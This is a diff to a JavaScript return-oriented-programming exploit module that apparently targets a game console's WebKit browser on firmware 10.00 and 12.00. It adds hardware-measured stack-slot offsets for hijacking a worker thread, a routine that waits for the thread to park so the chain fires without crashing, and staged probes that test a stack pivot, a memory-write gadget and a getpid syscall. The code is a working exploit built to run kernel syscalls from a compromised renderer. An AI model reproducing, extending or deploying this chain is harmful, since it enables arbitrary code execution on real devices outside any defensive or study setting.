@@ -90,13 +90,26 @@ const LKW_TABLE = {
  * The old code hardcoded this and refused to fire unless stack+0x7FC18 held
  * cond_wait's return address. The comment right here used to say a hardcoded
  * stack offset "is exactly the kind of measured constant that rots across
- * firmware" — and it did: on 12.00 that address holds libkernel+0x6d1d0, which
- * is not even text (12.00's text ends at 0x43F7E), it is bss. The frame layout
- * simply moved.
+ * firmware" — and it did.
+ *
+ * MEASURED ON HARDWARE, both consoles:
+ *   10.00 — slot at stack+0x7FC18, holds libkernel+0x190DB
+ *   12.00 — slot at stack+0x7FC28, holds libkernel+0x197FB;
+ *           stack+0x7FC18 holds libkernel+0x6D1D0, which is not even text
+ *           (12.00 text ends at 0x43F7E) — it is bss.
+ * So the frame moved by 0x10 and the old constant pointed at unrelated data.
+ * Note the RVA itself was never wrong: 0x197FB is exactly what the call-site
+ * signature predicts for 12.00. Only the stack POSITION rotted.
  *
  * A stack offset cannot be recovered statically from the module, so it is no
  * longer guessed at all — locateSlot() searches for it. This constant survives
- * so the log can say whether the firmware still happens to match 10.00. */
+ * so the log can say whether the firmware still happens to match 10.00.
+ *
+ * Deliberately NOT used as a fast path. Probing the hint first and accepting a
+ * match would be a real regression: on 12.00 the hint sits BELOW the live frame,
+ * so had 0x7FC18 happened to hold a stale copy of the same return address, the
+ * shortcut would have hijacked dead bytes. Top-down is the only ordering that
+ * guarantees the live frame, and it is paid once. */
 const SLOT_HINT = 0x7FC18n;
 
 /* HARD INVARIANT — do not reorder the chain.
@@ -305,6 +318,50 @@ function wrap(payload, withDone) {
     return c;
 }
 
+/* Block until the worker is genuinely back in cond_wait.
+ *
+ * fireSync() has always done this; fire() (the async path) never did, and got
+ * away with it only because it was used once, for a single getpid, right after
+ * survey(). It is no longer: the staged bisect fires three chains back to back,
+ * and firing while the worker is still unwinding is the documented cause of the
+ * renderer SIGSEGVs under sustained load (a slot rewritten mid-unwind makes it
+ * pivot into the next chain with no postMessage at all).
+ *
+ * Seeing the return address reappear is NOT sufficient — longjmp restores it
+ * with `mov [rsp], rcx ; ret` while the worker is still executing that very
+ * ret. Requiring slot+8 to be the worker's own data again is what proves it is
+ * past that point, so both words are checked and must agree repeatedly. */
+const PARK_STABLE = 8;
+
+function ensureParked() {
+    const want = W.kbase + W.slotRva;
+
+    // Capture the pristine frame exactly once, while known parked. Re-reading
+    // origNext per fire is a corruption bug: caught mid-unwind it captures our
+    // OWN previous chain pointer, which the next chain then faithfully restores
+    // into the worker's stack.
+    if (W.pristineNext === undefined) {
+        for (let i = 0; i < 2000000 && rd64(W.slot) !== want; i++) { /* park */ }
+        if (rd64(W.slot) !== want)
+            throw new Error("rop-worker: worker never parked for first capture"
+                            + " (slot holds " + hex(rd64(W.slot)) + ")");
+        W.pristineRet = rd64(W.slot);
+        W.pristineNext = rd64(W.slot + 8n);
+        return;
+    }
+
+    let stable = 0;
+    for (let i = 0; i < 4000000; i++) {
+        if (rd64(W.slot) === want && rd64(W.slot + 8n) === W.pristineNext) {
+            if (++stable >= PARK_STABLE) return;
+        } else {
+            stable = 0;
+        }
+    }
+    throw new Error("rop-worker: worker never re-parked, slot holds "
+                    + hex(rd64(W.slot)) + " next=" + hex(rd64(W.slot + 8n)));
+}
+
 /* ------------------------------------------------------------------ fire */
 
 async function fire(payload, timeoutMs) {
@@ -312,8 +369,9 @@ async function fire(payload, timeoutMs) {
     if (!W.stack) findWorkerStack();
 
     locateSlot();
-    W.origRet  = rd64(W.slot);
-    W.origNext = rd64(W.slot + 8n);
+    ensureParked();
+    W.origRet  = W.pristineRet;
+    W.origNext = W.pristineNext;
 
     // Re-check on every fire. locateSlot() proved the frame was there when it
     // searched; this proves it is STILL there now. A wrong slot corrupts the
@@ -671,6 +729,66 @@ async function survey() {
     return W;
 }
 
+/* ------------------------------------------------------ staged bisect ----
+ *
+ * A 12.00 console died inside the first testGetpid() with NO beacon at all —
+ * not a throw, a dead renderer — which says the chain ran and did not survive,
+ * but nothing about WHICH part. Every static check passes (pop_rsp, setjmp,
+ * longjmp, syscall_wrapper and the store gadget all disassemble correctly, the
+ * cond_wait resume site is instruction-identical to 10.00, and the WebKit exec
+ * segment is based at 0 on every firmware), so the answer is not in the module.
+ *
+ * Each console attempt costs a reboot, so spend one attempt learning instead of
+ * guessing. These three probes add exactly one chain element each:
+ *
+ *   testPivot  pop_rsp -> setjmp -> longjmp        (pivot, ctx capture, resume)
+ *   testStore  + pop_rax/pop_rdi/mov_qword_rdi_rax (the store used everywhere)
+ *   testGetpid + pop_rax/syscall_wrapper           (the syscall)
+ *
+ * The last beacon printed names the first element that does not survive. */
+
+function dumpGadgets() {
+    const names = ["pop_rsp", "setjmp", "longjmp", "syscall_wrapper",
+                   "pop_rax", "pop_rdi", "pop_rsi", "pop_rdx", "pop_rcx",
+                   "pop_r8", "mov_qword_rdi_rax"];
+    // Which module each gadget is relative to. Only pop_rsp varies: 11.x/12.00
+    // take it from WebKit because libkernel_web has no `pop rsp; ret` at all.
+    const lkNames = { setjmp: 1, longjmp: 1, syscall_wrapper: 1 };
+    for (const n of names) {
+        let a;
+        try { a = g(n); } catch (e) { log("gadget " + n + ": MISSING"); continue; }
+        const mod = (n === "pop_rsp") ? W.lkw.pop_rsp.mod
+                  : (lkNames[n] ? "lk" : "wk");
+        const rva = a - (mod === "lk" ? W.kbase : W.wbase);
+        log("gadget " + n + " = " + mod + "+" + hex(rva) + " -> " + hex(a));
+    }
+    log("bases: lk=" + hex(W.kbase) + " wk=" + hex(W.wbase)
+        + " ctx=" + hex(W.ctx) + " retval=" + hex(W.retval)
+        + " done=" + hex(W.done) + " chain=" + hex(W.chainBuf));
+}
+
+/* Pivot only: no payload at all. If this survives, then pop_rsp, the ctx
+ * capture, the three stores that patch ctx/slot, and the longjmp resume are all
+ * correct — which would clear everything the hijack itself depends on. */
+async function testPivot() {
+    const r = await fire(function () { /* no payload */ });
+    log("pivot probe survived");
+    return r;
+}
+
+/* Adds only the store primitive. wrap() already uses store() for its ctx/slot
+ * patching, so a failure here really means pop_rax/pop_rdi/mov_qword_rdi_rax
+ * are wrong — in which case the pivot probe above would already have died. */
+async function testStore() {
+    const MAGIC = 0x1234ABCD5678EF90n;
+    wr64(W.retval, 0n);
+    await fire(function (c) { c.store(W.retval, MAGIC); });
+    const got = rd64(W.retval);
+    log("store probe -> " + hex(got) + (got === MAGIC ? "  MATCH" : "  *** WRONG ***"));
+    if (got !== MAGIC) throw new Error("rop-worker: store probe wrote " + hex(got));
+    return got;
+}
+
 /* getpid(): 0 args, side-effect free, RE-verified number. If this returns a
  * plausible pid the whole path works - Worker, thread walk, hijack, chain,
  * syscall, and the longjmp resume. */
@@ -692,6 +810,7 @@ function testGetpidSync() {
 
 window.rop_worker = {
     init, survey, fire, syscall, testGetpid,
+    dumpGadgets, testPivot, testStore, locateSlot,
     alloc, allocReset, allocUsed, syscallBatch, syscallBatchTagged, leadThenBatchTagged,
     fireSync, syscallSync, testGetpidSync,
     enumerate, findWorkerStack, spawnWorker, ping, Chain,
